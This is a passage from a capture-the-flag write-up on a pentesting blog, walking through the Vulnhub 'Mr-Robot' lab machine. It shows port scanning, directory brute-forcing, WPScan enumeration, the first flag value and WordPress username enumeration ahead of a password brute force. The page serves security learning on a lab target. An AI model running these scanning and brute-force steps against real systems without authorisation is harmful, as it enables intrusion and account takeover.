<!doctype html><html lang=en><head><title>Vulnhub Mr-Robot WriteUp ¬∑ gunzf0x
</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=color-scheme content="light dark"><meta name=author content="gunzf0x"><meta name=description content="Vulnhub 'Mr-Robot' WriteUp"><meta name=keywords content="blog,pentesting,hacking,personal"><meta name=twitter:card content="summary"><meta name=twitter:title content="Vulnhub Mr-Robot WriteUp"><meta name=twitter:description content="Vulnhub 'Mr-Robot' WriteUp"><meta property="og:url" content="https://gunzf0x.github.io/pentesting/posts/mrrobot/"><meta property="og:site_name" content="gunzf0x"><meta property="og:title" content="Vulnhub Mr-Robot WriteUp"><meta property="og:description" content="Vulnhub 'Mr-Robot' WriteUp"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-08-15T00:00:00+00:00"><meta property="article:modified_time" content="2024-08-15T00:00:00+00:00"><meta property="article:tag" content="Vulnhub"><meta property="article:tag" content="Machine"><meta property="article:tag" content="Linux"><meta property="article:tag" content="Easy"><meta property="article:tag" content="Burpsuite"><meta property="article:tag" content="Nmap"><link rel=canonical href=https://gunzf0x.github.io/pentesting/posts/mrrobot/><link rel=preload href=/fonts/fa-brands-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-regular-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-solid-900.woff2 as=font type=font/woff2 crossorigin><link rel=stylesheet href=/pentesting/css/coder.min.577e3c5ead537873430da16f0964b754a120fd87c4e2203a00686e7c75b51378.css integrity="sha256-V348Xq1TeHNDDaFvCWS3VKEg/YfE4iA6AGhufHW1E3g=" crossorigin=anonymous media=screen><link rel=stylesheet href=/pentesting/css/coder-dark.min.064032bdabf71803ac209bfac7afe4609898265440caa172acba739538eb4845.css integrity="sha256-BkAyvav3GAOsIJv6x6/kYJiYJlRAyqFyrLpzlTjrSEU=" crossorigin=anonymous media=screen><link rel=icon type=image/png href=/pentesting/images/favicon-32x32.png sizes=any><link rel=icon type=image/png href=/pentesting/images/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=/pentesting/images/favicon-16x16.png sizes=16x16><link rel=apple-touch-icon href=/pentesting/images/apple-touch-icon.png><link rel=apple-touch-icon sizes=180x180 href=/pentesting/images/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/pentesting/images/safari-pinned-tab.svg color=#5bbad5></head><body class="preload-transitions colorscheme-auto"><div class=float-container><a id=dark-mode-toggle class=colorscheme-toggle><i class="fa-solid fa-adjust fa-fw" aria-hidden=true></i></a></div><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=/pentesting>gunzf0x
</a><input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle><i class="fa-solid fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/pentesting/about/>whoami</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/posts/>Blog/WriteUps</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/projects/>Projects</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/contact/>Contact me</a></li><li class="navigation-item menu-separator"><span>|</span></li><li class=navigation-item><a href=/pentesting/es/posts/mrrobot/>üá®üá±</a></li></ul></section></nav><div class=content><section class="container post"><article><header><div class=post-title><h1 class=title><a class=title-link href=https://gunzf0x.github.io/pentesting/posts/mrrobot/>Vulnhub Mr-Robot WriteUp</a></h1></div><div class=post-meta><div class=date><span class=posted-on><i class="fa-solid fa-calendar" aria-hidden=true></i>
<time datetime=2024-08-15T00:00:00Z>15 August, 2024
</time></span><span class=reading-time><i class="fa-solid fa-clock" aria-hidden=true></i>
14-minute read</span></div><div class=tags><i class="fa-solid fa-tag" aria-hidden=true></i>
<span class=tag><a href=/pentesting/tags/vulnhub/>Vulnhub</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/machine/>Machine</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/linux/>Linux</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/easy/>Easy</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/burpsuite/>Burpsuite</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/nmap/>Nmap</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/whatweb/>Whatweb</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/php/>Php</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/linpeas/>Linpeas</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/brute-force-password-cracking/>Brute Force Password Cracking</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/brute-force-password-login/>Brute Force Password Login</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/john/>John</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/sudo/>Sudo</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/wordpress/>Wordpress</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/wpscan/>Wpscan</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/hydra/>Hydra</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/suid/>Suid</a></span></div></div></header><div class=post-content><h1 id=mr-robot----vulnhub>Mr-Robot &ndash; Vulnhub
<a class=heading-link href=#mr-robot----vulnhub><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h1><ul><li>OS: <em>Linux</em></li><li>Difficulty: <em>Easy</em></li><li>Platform: <em>Vulnhub</em></li></ul><p><img alt="&lsquo;Mr-Robot&rsquo; Avatar" src=/pentesting/images/Vulnhub_avatar.png></p><hr><h2 id=summary>Summary
<a class=heading-link href=#summary><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><p><code>Mr-Robot</code> is an easy and free <code>Linux</code> machine from <code>Vulnhub</code>. After an initial scan above <code>TCP</code> ports, they show the victim machine is running a website. This website is running on <code>WordPress</code>. Since <code>Wordpress</code> shows a different message when a user exists or not (even if we provide a wrong password), we can abuse this message error to search for valid users thanks to a previously found dictionary. We can use this dictionary to bruteforce the user and the password for this user. Once inside the <code>WordPress</code> panel, we are able to add a custom malicious plugin and gain initial access to the target machine. We are able to find a password hash and crack it though a <code>Bruteforce Password Cracking</code> and pivot to a new user. Finally, we see that there is an unusual <code>SUID</code> file which can be abused to gain access as <code>root</code> user.</p><hr><h2 id=user>User
<a class=heading-link href=#user><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><ul><li>Starting with a <code>Nmap</code> scan for open <code>TCP</code> ports shows the following:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sudo nmap -sS -p- --open --min-rate=5000 -n -Pn -vvv 10.20.1.120
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-13 01:02 -04
</span></span></span><span class=line><span class=cl><span class=go>Initiating ARP Ping Scan at 01:02
</span></span></span><span class=line><span class=cl><span class=go>Scanning 10.20.1.120 [1 port]
</span></span></span><span class=line><span class=cl><span class=go>Completed ARP Ping Scan at 01:02, 0.08s elapsed (1 total hosts)
</span></span></span><span class=line><span class=cl><span class=go>Initiating SYN Stealth Scan at 01:02
</span></span></span><span class=line><span class=cl><span class=go>Scanning 10.20.1.120 [65535 ports]
</span></span></span><span class=line><span class=cl><span class=go>Discovered open port 443/tcp on 10.20.1.120
</span></span></span><span class=line><span class=cl><span class=go>Discovered open port 80/tcp on 10.20.1.120
</span></span></span><span class=line><span class=cl><span class=go>Completed SYN Stealth Scan at 01:03, 26.39s elapsed (65535 total ports)
</span></span></span><span class=line><span class=cl><span class=go>Nmap scan report for 10.20.1.120
</span></span></span><span class=line><span class=cl><span class=go>Host is up, received arp-response (0.00038s latency).
</span></span></span><span class=line><span class=cl><span class=go>Scanned at 2024-08-13 01:02:38 -04 for 26s
</span></span></span><span class=line><span class=cl><span class=go>Not shown: 65532 filtered tcp ports (no-response), 1 closed tcp port (reset)
</span></span></span><span class=line><span class=cl><span class=go>Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
</span></span></span><span class=line><span class=cl><span class=go>PORT    STATE SERVICE REASON
</span></span></span><span class=line><span class=cl><span class=go>80/tcp  open  http    syn-ack ttl 64
</span></span></span><span class=line><span class=cl><span class=go>443/tcp open  https   syn-ack ttl 64
</span></span></span><span class=line><span class=cl><span class=go>MAC Address: 08:00:27:67:F5:05 (Oracle VirtualBox virtual NIC)
</span></span></span></code></pre></div><ul><li>From the scan we can see 2 ports open: <code>80</code> <code>HTTP</code> and <code>443</code> <code>HTTPs</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sudo nmap -sVC -p80,443 10.20.1.120 -oN targeted
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-13 01:06 -04
</span></span></span><span class=line><span class=cl><span class=go>Nmap scan report for 10.20.1.120
</span></span></span><span class=line><span class=cl><span class=go>Host is up (0.00038s latency).
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>PORT    STATE SERVICE  VERSION
</span></span></span><span class=line><span class=cl><span class=go>80/tcp  open  http     Apache httpd
</span></span></span><span class=line><span class=cl><span class=go>|_http-server-header: Apache
</span></span></span><span class=line><span class=cl><span class=go>|_http-title: Site doesn&#39;t have a title (text/html).
</span></span></span><span class=line><span class=cl><span class=go>443/tcp open  ssl/http Apache httpd
</span></span></span><span class=line><span class=cl><span class=go>|_http-server-header: Apache
</span></span></span><span class=line><span class=cl><span class=go>| ssl-cert: Subject: commonName=www.example.com
</span></span></span><span class=line><span class=cl><span class=go>| Not valid before: 2015-09-16T10:45:03
</span></span></span><span class=line><span class=cl><span class=go>|_Not valid after:  2025-09-13T10:45:03
</span></span></span><span class=line><span class=cl><span class=go>|_http-title: Site doesn&#39;t have a title (text/html).
</span></span></span><span class=line><span class=cl><span class=go>MAC Address: 08:00:27:67:F5:05 (Oracle VirtualBox virtual NIC)
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span></span><span class=line><span class=cl><span class=go>Nmap done: 1 IP address (1 host up) scanned in 34.74 seconds
</span></span></span></code></pre></div><ul><li>Using <code>WhatWeb</code> on this site shows the following:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ whatweb -a3 http://10.20.1.120
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>http://10.20.1.120 [200 OK] Apache, Country[RESERVED][ZZ], HTML5, HTTPServer[Apache], IP[10.20.1.120], Script, UncommonHeaders[x-mod-pagespeed], X-Frame-Options[SAMEORIGIN]
</span></span></span></code></pre></div><p>where I can&rsquo;t see any interesting info.</p><ul><li>Visiting <code>http://10.120.1.120</code> (the victim&rsquo;s machine IP address) shows a simple webpage:</li></ul><p><img alt="MrRobot 1" src=/pentesting/images/MrRobot_1.png></p><ul><li>There I can see many &ldquo;commands&rdquo; as options. Selecting every one of them shows different videos and posts related to &ldquo;Mr. Robot&rdquo; show series. At this point I start to search for directories attempting a <code>Brute Force Directory Listing</code> with <code>Gobuster</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.20.1.120 -x php,txt
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>Gobuster v3.6
</span></span></span><span class=line><span class=cl><span class=go>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>[+] Url:                     http://10.20.1.120
</span></span></span><span class=line><span class=cl><span class=go>[+] Method:                  GET
</span></span></span><span class=line><span class=cl><span class=go>[+] Threads:                 10
</span></span></span><span class=line><span class=cl><span class=go>[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
</span></span></span><span class=line><span class=cl><span class=go>[+] Negative Status codes:   404
</span></span></span><span class=line><span class=cl><span class=go>[+] User Agent:              gobuster/3.6
</span></span></span><span class=line><span class=cl><span class=go>[+] Extensions:              php,txt
</span></span></span><span class=line><span class=cl><span class=go>[+] Timeout:                 10s
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>Starting gobuster in directory enumeration mode
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>/images               (Status: 301) [Size: 234] [--&gt; http://10.20.1.120/images/]
</span></span></span><span class=line><span class=cl><span class=go>/index.php            (Status: 301) [Size: 0] [--&gt; http://10.20.1.120/]
</span></span></span><span class=line><span class=cl><span class=go>/blog                 (Status: 301) [Size: 232] [--&gt; http://10.20.1.120/blog/]
</span></span></span><span class=line><span class=cl><span class=go>/rss                  (Status: 301) [Size: 0] [--&gt; http://10.20.1.120/feed/]
</span></span></span><span class=line><span class=cl><span class=go>/sitemap              (Status: 200) [Size: 0]
</span></span></span><span class=line><span class=cl><span class=go>/login                (Status: 302) [Size: 0] [--&gt; http://10.20.1.120/wp-login.php]
</span></span></span><span class=line><span class=cl><span class=go>/0                    (Status: 301) [Size: 0] [--&gt; http://10.20.1.120/0/]
</span></span></span><span class=line><span class=cl><span class=go>/feed                 (Status: 301) [Size: 0] [--&gt; http://10.20.1.120/feed/]
</span></span></span><span class=line><span class=cl><span class=go>/video                (Status: 301) [Size: 233] [--&gt; http://10.20.1.120/video/]
</span></span></span><span class=line><span class=cl><span class=go>/image                (Status: 301) [Size: 0] [--&gt; http://10.20.1.120/image/]
</span></span></span><span class=line><span class=cl><span class=go>/atom                 (Status: 301) [Size: 0] [--&gt; http://10.20.1.120/feed/atom/]
</span></span></span><span class=line><span class=cl><span class=go>/wp-content           (Status: 301) [Size: 238] [--&gt; http://10.20.1.120/wp-content/]
</span></span></span><span class=line><span class=cl><span class=go>/admin                (Status: 301) [Size: 233] [--&gt; http://10.20.1.120/admin/]
</span></span></span><span class=line><span class=cl><span class=go>/audio                (Status: 301) [Size: 233] [--&gt; http://10.20.1.120/audio/]
</span></span></span><span class=line><span class=cl><span class=go>/intro                (Status: 200) [Size: 516314]
</span></span></span><span class=line><span class=cl><span class=go>/wp-login             (Status: 200) [Size: 2657]
</span></span></span><span class=line><span class=cl><span class=go>/wp-login.php         (Status: 200) [Size: 2657]
</span></span></span><span class=line><span class=cl><span class=go>/css                  (Status: 301) [Size: 231] [--&gt; http://10.20.1.120/css/]
</span></span></span><span class=line><span class=cl><span class=go>/rss2                 (Status: 301) [Size: 0] [--&gt; http://10.20.1.120/feed/]
</span></span></span><span class=line><span class=cl><span class=go>/license              (Status: 200) [Size: 309]
</span></span></span><span class=line><span class=cl><span class=go>/license.txt          (Status: 200) [Size: 309]
</span></span></span><span class=line><span class=cl><span class=go>/wp-includes          (Status: 301) [Size: 239] [--&gt; http://10.20.1.120/wp-includes/]
</span></span></span><span class=line><span class=cl><span class=go>/js                   (Status: 301) [Size: 230] [--&gt; http://10.20.1.120/js/]
</span></span></span><span class=line><span class=cl><span class=go>/wp-register.php      (Status: 301) [Size: 0] [--&gt; http://10.20.1.120/wp-login.php?action=register]
</span></span></span><span class=line><span class=cl><span class=go>/Image                (Status: 301) [Size: 0] [--&gt; http://10.20.1.120/Image/]
</span></span></span><span class=line><span class=cl><span class=go>/wp-rss2.php          (Status: 301) [Size: 0] [--&gt; http://10.20.1.120/feed/]
</span></span></span><span class=line><span class=cl><span class=go>/rdf                  (Status: 301) [Size: 0] [--&gt; http://10.20.1.120/feed/rdf/]
</span></span></span><span class=line><span class=cl><span class=go>/page1                (Status: 301) [Size: 0] [--&gt; http://10.20.1.120/]
</span></span></span><span class=line><span class=cl><span class=go>/readme               (Status: 200) [Size: 64]
</span></span></span><span class=line><span class=cl><span class=go>/robots               (Status: 200) [Size: 41]
</span></span></span><span class=line><span class=cl><span class=go>/robots.txt           (Status: 200) [Size: 41]
</span></span></span><span class=line><span class=cl><span class=go>/dashboard            (Status: 302) [Size: 0] [--&gt; http://10.20.1.120/wp-admin/]
</span></span></span><span class=line><span class=cl><span class=go>/%20                  (Status: 301) [Size: 0] [--&gt; http://10.20.1.120/]
</span></span></span><span class=line><span class=cl><span class=go>/wp-admin             (Status: 301) [Size: 236] [--&gt; http://10.20.1.120/wp-admin/]
</span></span></span></code></pre></div><ul><li>From these directories I note that this site is running on <code>WordPress</code>. Visiting <code>http://10.20.1.120/wp-admin</code> directory just confirms it:</li></ul><p><img alt="MrRobot 2" src=/pentesting/images/MrRobot_2.png></p><ul><li>Additionally, I note there is a <code>robots.txt</code> file. Checking it with <code>cURL</code> on console shows:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ curl -s http://10.20.1.120/robots.txt
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>User-agent: *
</span></span></span><span class=line><span class=cl><span class=go>fsocity.dic
</span></span></span><span class=line><span class=cl><span class=go>key-1-of-3.txt
</span></span></span></code></pre></div><p>where I can see 2 potential files: <code>fsocity.dic</code> and <code>key-1-of-3.txt</code></p><ul><li>If I check the content of <code>http://10.20.1.120/fsocity.dic</code> we have a lot of words. We can visit that page in a web browser and this file will be downloaded. I note that this dictionary has 858160 lines/words:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ cat fsocity.dic | wc -l
</span></span></span><span class=line><span class=cl><span class=go>858160
</span></span></span></code></pre></div><ul><li><code>key-1-of-3.txt</code> file shows some text:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ curl -s http://10.20.1.120/key-1-of-3.txt
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>073403c8a58a1f80d943455fb30724b9
</span></span></span></code></pre></div><p>which is the first flag of the machine.</p><ul><li>At this point, since the site is using <code>WordPress</code>, I will use <code>WPScan</code> against this site. First, scanning for plugins:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ wpscan -e ap --plugins-detection aggressive --url http://10.20.1.120 -t 40
</span></span></span><span class=line><span class=cl><span class=go>_______________________________________________________________
</span></span></span><span class=line><span class=cl><span class=go>         __          _______   _____
</span></span></span><span class=line><span class=cl><span class=go>         \ \        / /  __ \ / ____|
</span></span></span><span class=line><span class=cl><span class=go>          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ¬Æ
</span></span></span><span class=line><span class=cl><span class=go>           \ \/  \/ / |  ___/ \___ \ / __|/ _` | &#39;_ \
</span></span></span><span class=line><span class=cl><span class=go>            \  /\  /  | |     ____) | (__| (_| | | | |
</span></span></span><span class=line><span class=cl><span class=go>             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>         WordPress Security Scanner by the WPScan Team
</span></span></span><span class=line><span class=cl><span class=go>                         Version 3.8.25
</span></span></span><span class=line><span class=cl><span class=go>       Sponsored by Automattic - https://automattic.com/
</span></span></span><span class=line><span class=cl><span class=go>       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
</span></span></span><span class=line><span class=cl><span class=go>_______________________________________________________________
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[i] It seems like you have not updated the database for some time.
</span></span></span><span class=line><span class=cl><span class=go>[?] Do you want to update now? [Y]es [N]o, default: [N]n
</span></span></span><span class=line><span class=cl><span class=go>[+] URL: http://10.20.1.120/ [10.20.1.120]
</span></span></span><span class=line><span class=cl><span class=go>[+] Started: Tue Aug 13 01:36:17 2024
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Interesting Finding(s):
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[+] Headers
</span></span></span><span class=line><span class=cl><span class=go> | Interesting Entries:
</span></span></span><span class=line><span class=cl><span class=go> |  - Server: Apache
</span></span></span><span class=line><span class=cl><span class=go> |  - X-Mod-Pagespeed: 1.9.32.3-4523
</span></span></span><span class=line><span class=cl><span class=go> | Found By: Headers (Passive Detection)
</span></span></span><span class=line><span class=cl><span class=go> | Confidence: 100%
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[+] robots.txt found: http://10.20.1.120/robots.txt
</span></span></span><span class=line><span class=cl><span class=go> | Found By: Robots Txt (Aggressive Detection)
</span></span></span><span class=line><span class=cl><span class=go> | Confidence: 100%
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[+] XML-RPC seems to be enabled: http://10.20.1.120/xmlrpc.php
</span></span></span><span class=line><span class=cl><span class=go> | Found By: Direct Access (Aggressive Detection)
</span></span></span><span class=line><span class=cl><span class=go> | Confidence: 100%
</span></span></span><span class=line><span class=cl><span class=go> | References:
</span></span></span><span class=line><span class=cl><span class=go> |  - http://codex.wordpress.org/XML-RPC_Pingback_API
</span></span></span><span class=line><span class=cl><span class=go> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
</span></span></span><span class=line><span class=cl><span class=go> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
</span></span></span><span class=line><span class=cl><span class=go> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
</span></span></span><span class=line><span class=cl><span class=go> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[+] The external WP-Cron seems to be enabled: http://10.20.1.120/wp-cron.php
</span></span></span><span class=line><span class=cl><span class=go> | Found By: Direct Access (Aggressive Detection)
</span></span></span><span class=line><span class=cl><span class=go> | Confidence: 60%
</span></span></span><span class=line><span class=cl><span class=go> | References:
</span></span></span><span class=line><span class=cl><span class=go> |  - https://www.iplocation.net/defend-wordpress-from-ddos
</span></span></span><span class=line><span class=cl><span class=go> |  - https://github.com/wpscanteam/wpscan/issues/1299
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[+] WordPress version 4.3.1 identified (Insecure, released on 2015-09-15).
</span></span></span><span class=line><span class=cl><span class=go> | Found By: Emoji Settings (Passive Detection)
</span></span></span><span class=line><span class=cl><span class=go> |  - http://10.20.1.120/0a0fd7f.html, Match: &#39;wp-includes\/js\/wp-emoji-release.min.js?ver=4.3.1&#39;
</span></span></span><span class=line><span class=cl><span class=go> | Confirmed By: Meta Generator (Passive Detection)
</span></span></span><span class=line><span class=cl><span class=go> |  - http://10.20.1.120/0a0fd7f.html, Match: &#39;WordPress 4.3.1&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[+] WordPress theme in use: twentyfifteen
</span></span></span><span class=line><span class=cl><span class=go> | Location: http://10.20.1.120/wp-content/themes/twentyfifteen/
</span></span></span><span class=line><span class=cl><span class=go> | Last Updated: 2023-11-07T00:00:00.000Z
</span></span></span><span class=line><span class=cl><span class=go> | Readme: http://10.20.1.120/wp-content/themes/twentyfifteen/readme.txt
</span></span></span><span class=line><span class=cl><span class=go> | [!] The version is out of date, the latest version is 3.6
</span></span></span><span class=line><span class=cl><span class=go> | Style URL: http://10.20.1.120/wp-content/themes/twentyfifteen/style.css?ver=4.3.1
</span></span></span><span class=line><span class=cl><span class=go> | Style Name: Twenty Fifteen
</span></span></span><span class=line><span class=cl><span class=go> | Style URI: https://wordpress.org/themes/twentyfifteen/
</span></span></span><span class=line><span class=cl><span class=go> | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen&#39;s simple, st...
</span></span></span><span class=line><span class=cl><span class=go> | Author: the WordPress team
</span></span></span><span class=line><span class=cl><span class=go> | Author URI: https://wordpress.org/
</span></span></span><span class=line><span class=cl><span class=go> |
</span></span></span><span class=line><span class=cl><span class=go> | Found By: Css Style In 404 Page (Passive Detection)
</span></span></span><span class=line><span class=cl><span class=go> |
</span></span></span><span class=line><span class=cl><span class=go> | Version: 1.3 (80% confidence)
</span></span></span><span class=line><span class=cl><span class=go> | Found By: Style (Passive Detection)
</span></span></span><span class=line><span class=cl><span class=go> |  - http://10.20.1.120/wp-content/themes/twentyfifteen/style.css?ver=4.3.1, Match: &#39;Version: 1.3&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[+] Enumerating All Plugins (via Aggressive Methods)
</span></span></span><span class=line><span class=cl><span class=go> Checking Known Locations - Time: 00:29:34 &lt;=====================================================================================&gt; (104860 / 104860) 100.00% Time: 00:29:34
</span></span></span><span class=line><span class=cl><span class=go>[+] Checking Plugin Versions (via Passive and Aggressive Methods)
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[i] Plugin(s) Identified:
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[+] akismet
</span></span></span><span class=line><span class=cl><span class=go> | Location: http://10.20.1.120/wp-content/plugins/akismet/
</span></span></span><span class=line><span class=cl><span class=go> | Latest Version: 5.3.1
</span></span></span><span class=line><span class=cl><span class=go> | Last Updated: 2024-01-17T22:32:00.000Z
</span></span></span><span class=line><span class=cl><span class=go> |
</span></span></span><span class=line><span class=cl><span class=go> | Found By: Known Locations (Aggressive Detection)
</span></span></span><span class=line><span class=cl><span class=go> |  - http://10.20.1.120/wp-content/plugins/akismet/, status: 403
</span></span></span><span class=line><span class=cl><span class=go> |
</span></span></span><span class=line><span class=cl><span class=go> | The version could not be determined.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[!] No WPScan API Token given, as a result vulnerability data has not been output.
</span></span></span><span class=line><span class=cl><span class=go>[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[+] Finished: Tue Aug 13 02:06:24 2024
</span></span></span><span class=line><span class=cl><span class=go>[+] Requests Done: 104918
</span></span></span><span class=line><span class=cl><span class=go>[+] Cached Requests: 55
</span></span></span><span class=line><span class=cl><span class=go>[+] Data Sent: 27.47 MB
</span></span></span><span class=line><span class=cl><span class=go>[+] Data Received: 33.071 MB
</span></span></span><span class=line><span class=cl><span class=go>[+] Memory used: 434.199 MB
</span></span></span><span class=line><span class=cl><span class=go>[+] Elapsed time: 00:30:06
</span></span></span></code></pre></div><ul><li>Old <code>WordPress</code> version shows the message <code>Invalid username</code> when we provide an invalid username and/or password. But if the user exists this message is not displayed. For example:</li></ul><p><img alt="MrRobot 4" src=/pentesting/images/MrRobot_4.png></p><ul><li>If a user exists, but the password is not correct, we usually don&rsquo;t get this message. We can play with this response with <code>Hydra</code> attempting to &ldquo;bruteforce&rdquo; users from the dictionary we have just downloaded. I note that there are some duplicated lines in <code>fsocity.dic</code> file, so we save the non-repeated lines into a new file:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sort -u fsocity.dic &gt; sorted_fsocity.dic
</span></span></span></code></pre></div><ul><li>Doing this small step saves us a lot of time, since we pass from the original file with a huge number of lines (more than <code>80 000+</code>):</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ cat fsocity.dic | wc -l
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
